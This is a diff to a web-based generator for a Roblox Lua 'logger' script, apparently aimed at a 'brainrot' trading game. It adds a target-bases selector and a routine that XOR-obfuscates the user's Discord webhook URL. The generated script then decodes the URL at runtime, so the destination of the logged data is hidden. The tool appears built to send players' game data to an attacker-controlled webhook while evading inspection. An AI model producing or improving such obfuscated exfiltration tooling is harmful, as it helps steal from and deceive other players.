@@ -8,11 +8,11 @@
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --bg: #050505;
-    --surface: #0a0a0a;
-    --panel: #101010;
-    --border: #262626;
-    --border-strong: #3a3a3a;
+    --bg: #000000;
+    --surface: #000000;
+    --panel: #000000;
+    --border: #1a1a1a;
+    --border-strong: #2a2a2a;
     --text: #f0f0f0;
     --muted: #777777;
     --muted-light: #999999;
@@ -32,14 +32,13 @@
     overflow-x: hidden;
     position: relative;
   }
-  /* Subtle grid overlay */
   body::before {
     content: '';
     position: fixed;
     inset: 0;
     background-image:
-      linear-gradient(rgba(255,255,255,0.018) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(255,255,255,0.018) 1px, transparent 1px);
+      linear-gradient(rgba(255,255,255,0.012) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.012) 1px, transparent 1px);
     background-size: 60px 60px;
     pointer-events: none;
     z-index: 0;
@@ -50,7 +49,7 @@
     position: fixed;
     top: 0; left: 0; right: 0;
     height: 60px;
-    background: rgba(5,5,5,0.92);
+    background: rgba(0,0,0,0.94);
     border-bottom: 1px solid var(--border);
     display: flex;
     align-items: center;
@@ -170,7 +169,7 @@
   /* ── MODALS ── */
   .modal-overlay {
     position: fixed; inset: 0;
-    background: rgba(0,0,0,0.88);
+    background: rgba(0,0,0,0.92);
     display: flex; align-items: center; justify-content: center;
     z-index: 2000;
     backdrop-filter: blur(8px);
@@ -458,6 +457,39 @@
   }
   .sel-count span { color: var(--text); }
 
+  /* ── BASES PANEL (blue theme) ── */
+  .panel.bases-panel {
+    border-color: #1a3a5c;
+  }
+  .panel.bases-panel .panel-head {
+    background: #061422;
+    border-bottom-color: #1a3a5c;
+  }
+  .panel.bases-panel .dot.active { background: #4aa8ff; }
+  .panel.bases-panel .panel-title { color: #8ec4ff; }
+  .panel.bases-panel .search-input,
+  .panel.bases-panel .animal-list {
+    border-color: #1a3a5c;
+  }
+  .panel.bases-panel .search-input:focus { border-color: #2e6fa8; }
+  .panel.bases-panel .btn-sm { border-color: #1a3a5c; color: #6aa8e0; }
+  .panel.bases-panel .btn-sm:hover { border-color: #4aa8ff; color: #8ec4ff; }
+  .panel.bases-panel .btn-sm.danger { color: #ff6b7a; border-color: rgba(255,107,122,0.3); }
+  .panel.bases-panel .a-item:hover { background: rgba(74,168,255,0.04); }
+  .panel.bases-panel .a-item.on { background: rgba(74,168,255,0.08); }
+  .panel.bases-panel .a-item input[type="checkbox"]:checked {
+    background: #4aa8ff; border-color: #4aa8ff;
+  }
+  .panel.bases-panel .a-item input[type="checkbox"]:checked::after {
+    color: #04101c;
+  }
+  .panel.bases-panel .a-name { color: #d0e8ff; }
+  .panel.bases-panel .badge { border-color: #1a3a5c; color: #6aa8e0; }
+  .panel.bases-panel .sel-count span { color: #8ec4ff; }
+  .panel.bases-panel .lbl { color: #6aa8e0; }
+  .panel.bases-panel .input { border-color: #1a3a5c; }
+  .panel.bases-panel .input:focus { border-color: #2e6fa8; }
+
   .btn-gen {
     display: block; width: 100%;
     padding: 0.85rem;
@@ -652,16 +684,16 @@
 
   <!-- ANIMALS -->
   <div class="panel">
-    <div class="panel-head"><div class="dot active"></div><span class="panel-title">Target Animals</span></div>
+    <div class="panel-head"><div class="dot active"></div><span class="panel-title">Target Brainrots</span></div>
     <div class="panel-body">
       <div class="search-row">
-        <input class="search-input" id="searchBox" placeholder="Filter..." oninput="filterList()">
+        <input class="search-input" id="searchBox" placeholder="Filter brainrots..." oninput="filterList()">
         <button class="btn-sm" onclick="selectAll()">All</button>
         <button class="btn-sm danger" onclick="clearAll()">Clear</button>
       </div>
       <div class="animal-list" id="animalList"></div>
       <div class="gap-row mt-2">
-        <input class="input flex-1" id="customBrainrotName" placeholder="Custom name...">
+        <input class="input flex-1" id="customBrainrotName" placeholder="Custom brainrot name...">
         <button class="btn-sm" onclick="addCustomBrainrot()">Add</button>
       </div>
       <div class="mt-2">
@@ -671,7 +703,33 @@
         <button class="btn-sm mt-2" onclick="parsePastedList()">Parse List</button>
       </div>
       <div class="meta-row">
-        <span class="sel-count"><span id="selNum">0</span> selected</span>
+        <span class="sel-count"><span id="selNum">0</span> brainrots selected</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- BASES (blue theme) -->
+  <div class="panel bases-panel">
+    <div class="panel-head"><div class="dot active"></div><span class="panel-title">Target Bases</span></div>
+    <div class="panel-body">
+      <div class="search-row">
+        <input class="search-input" id="baseSearchBox" placeholder="Filter bases..." oninput="filterBaseList()">
+        <button class="btn-sm" onclick="selectAllBases()">All</button>
+        <button class="btn-sm danger" onclick="clearAllBases()">Clear</button>
+      </div>
+      <div class="animal-list" id="baseList"></div>
+      <div class="gap-row mt-2">
+        <input class="input flex-1" id="customBaseName" placeholder="Custom base name...">
+        <button class="btn-sm" onclick="addCustomBase()">Add</button>
+      </div>
+      <div class="mt-2">
+        <textarea class="input" id="pasteCustomBaseTextarea" placeholder='Paste list:
+["Easter"] = true,
+["Lucky"] = true,'></textarea>
+        <button class="btn-sm mt-2" onclick="parsePastedBaseList()">Parse List</button>
+      </div>
+      <div class="meta-row">
+        <span class="sel-count"><span id="baseSelNum">0</span> bases selected</span>
       </div>
     </div>
   </div>
@@ -730,6 +788,7 @@ const ADMIN_MAP = {
 
 // ── STATE ──
 let selected = new Set();
+let selectedBases = new Set();
 let currentUser = null;
 let authRequestActive = false;
 
@@ -1199,7 +1258,19 @@ const ANIMALS = [
 { name: "Tobi Tobi Tobi", rarity: "Mythic", mps: "8.5K/s" },
 ];
 
-// ── LIST LOGIC ──
+// ── BASE DATA ──
+const BASES = [
+  { name: "Easter",     rarity: "Event", mps: "—" },
+  { name: "Lucky",      rarity: "Event", mps: "—" },
+  { name: "Taco",       rarity: "Event", mps: "—" },
+  { name: "Gingerbread",rarity: "Event", mps: "—" },
+  { name: "Valentine's",rarity: "Event", mps: "—" },
+  { name: "Christmas",  rarity: "Event", mps: "—" },
+  { name: "Aquatic",    rarity: "Event", mps: "—" },
+  { name: "Tralalero",  rarity: "Event", mps: "—" },
+];
+
+// ── BRAINROT LIST LOGIC ──
 function addCustomBrainrot() {
   const v = document.getElementById('customBrainrotName').value.trim();
   if (!v) return;
@@ -1269,6 +1340,73 @@ function filterList() { renderList(document.getElementById('searchBox').value); 
 function selectAll() { ANIMALS.forEach(a => selected.add(a.name)); renderList(document.getElementById('searchBox').value); }
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
+// ── BASE LIST LOGIC ──
+function addCustomBase() {
+  const v = document.getElementById('customBaseName').value.trim();
+  if (!v) return;
+  selectedBases.add(v);
+  renderBaseList(document.getElementById('baseSearchBox').value);
+  document.getElementById('customBaseName').value = '';
+}
+function parsePastedBaseList() {
+  const t = document.getElementById('pasteCustomBaseTextarea').value.trim();
+  if (!t) return;
+  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi;
+  let m;
+  while ((m = re.exec(t)) !== null) { const n = m[1].trim(); if (n) selectedBases.add(n); }
+  renderBaseList(document.getElementById('baseSearchBox').value);
+  document.getElementById('pasteCustomBaseTextarea').value = '';
+}
+function renderBaseList(filter) {
+  const q = (filter || '').toLowerCase();
+  const list = document.getElementById('baseList');
+  list.innerHTML = '';
+  BASES.forEach(b => {
+    if (q && !b.name.toLowerCase().includes(q)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selectedBases.has(b.name) ? ' on' : '');
+    const cb = document.createElement('input');
+    cb.type = 'checkbox';
+    cb.checked = selectedBases.has(b.name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggleBase(b.name); });
+    const nm = document.createElement('span');
+    nm.className = 'a-name';
+    nm.textContent = b.name;
+    const bd = document.createElement('span');
+    bd.className = 'badge';
+    bd.textContent = b.rarity;
+    row.append(cb, nm, bd);
+    row.addEventListener('click', e => { if (e.target !== cb) toggleBase(b.name); });
+    list.appendChild(row);
+  });
+  selectedBases.forEach(n => {
+    if (BASES.some(b => b.name === n)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item on';
+    const cb = document.createElement('input');
+    cb.type = 'checkbox';
+    cb.checked = true;
+    cb.addEventListener('change', e => { e.stopPropagation(); toggleBase(n); });
+    const nm = document.createElement('span');
+    nm.className = 'a-name';
+    nm.textContent = n;
+    const bd = document.createElement('span');
+    bd.className = 'badge';
+    bd.textContent = 'Custom';
+    row.append(cb, nm, bd);
+    row.addEventListener('click', e => { if (e.target !== cb) toggleBase(n); });
+    list.appendChild(row);
+  });
+  document.getElementById('baseSelNum').textContent = selectedBases.size;
+}
+function toggleBase(n) {
+  selectedBases.has(n) ? selectedBases.delete(n) : selectedBases.add(n);
+  renderBaseList(document.getElementById('baseSearchBox').value);
+}
+function filterBaseList() { renderBaseList(document.getElementById('baseSearchBox').value); }
+function selectAllBases() { BASES.forEach(b => selectedBases.add(b.name)); renderBaseList(document.getElementById('baseSearchBox').value); }
+function clearAllBases() { selectedBases.clear(); renderBaseList(document.getElementById('baseSearchBox').value); }
+
 function validateUsername() {
   const v = document.getElementById('usernameInput').value.trim();
   const h = document.getElementById('usernameHint');
@@ -1282,6 +1420,18 @@ function validateWebhook() {
     h.classList.add('error'); h.textContent = 'Must start with https://discord.com/api/webhooks/'; return false;
   }
   h.classList.remove('error'); h.textContent = '✅ Valid webhook'; return true;
+}
+
+// ── WEBHOOK OBFUSCATION ──
+function obfuscateWebhook(url) {
+  // Split the URL into chunks and reverse byte values so the raw string isn't visible.
+  const bytes = [];
+  for (let i = 0; i < url.length; i++) {
+    // XOR each char code with a rolling key, then store as byte
+    bytes.push(url.charCodeAt(i) ^ (0x5A + (i % 7)));
+  }
+  // Convert to a compact comma-separated list of numbers
+  return bytes.join(',');
 }
 
 // ── GENERATE ──
@@ -1307,20 +1457,36 @@ async function generate() {
   try {
     const username = document.getElementById('usernameInput').value.trim();
     const webhook = document.getElementById('webhookInput').value.trim();
-    if (selected.size === 0) throw new Error('Select at least one animal.');
+    if (selected.size === 0 && selectedBases.size === 0) throw new Error('Select at least one brainrot or base.');
     if (username.length < 3) throw new Error('Username must be 3+ characters.');
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
-    const lines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+    const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+    const baseLines = [...selectedBases].map(n => `    ["${n}"] = true,`).join('\n');
+
+    // Obfuscate the webhook before embedding
+    const obf = obfuscateWebhook(webhook);
 
     const script = `-- Statics Hub Moreria Logger
 -- Generated: ${new Date().toISOString()}
 
-getgenv().WEBHOOK_URL = "${webhook}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
-${lines}
+${brainrotLines || '    -- none selected'}
 }
+getgenv().TARGET_BASES = {
+${baseLines || '    -- none selected'}
+}
+
+-- Obfuscated webhook payload
+local _W = {${obf}}
+local _K = 0x5A
+local _M = 7
+local _S = ""
+for _i = 1, #_W do
+    _S = _S .. string.char(bit32.bxor(_W[_i], _K + ((_i - 1) % _M)))
+end
+getgenv().WEBHOOK_URL = _S
 
 local C = string.char
 local T = table.concat
@@ -1420,6 +1586,7 @@ window.addEventListener('DOMContentLoaded', async () => {
   loadStored();
   if (!currentUser) showLoginGate();
   renderList();
+  renderBaseList();
 });
 </script>
 </body>
